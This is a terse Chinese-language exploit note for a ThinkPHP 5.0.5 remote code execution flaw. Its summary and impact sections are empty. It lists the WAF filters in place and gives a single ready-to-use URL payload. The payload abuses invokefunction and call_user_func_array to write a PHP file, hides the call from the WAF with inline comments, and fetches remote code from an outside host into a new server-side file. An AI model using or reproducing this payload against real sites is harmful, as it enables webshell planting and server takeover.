Thinkphp 5.0.5
==============

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

waf对eval进行了拦截

禁止了assert函数对eval函数后面的括号进行了正则过滤

对file\_get\_contents函数后面的括号进行了正则过滤

    http://www.0-sec.org/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]=<?php /*1111*//***/file_put_contents/*1**/(/***/'index11.php'/**/,file_get_contents(/**/'https://www.hack.com/xxx.js'))/**/;/**/?>
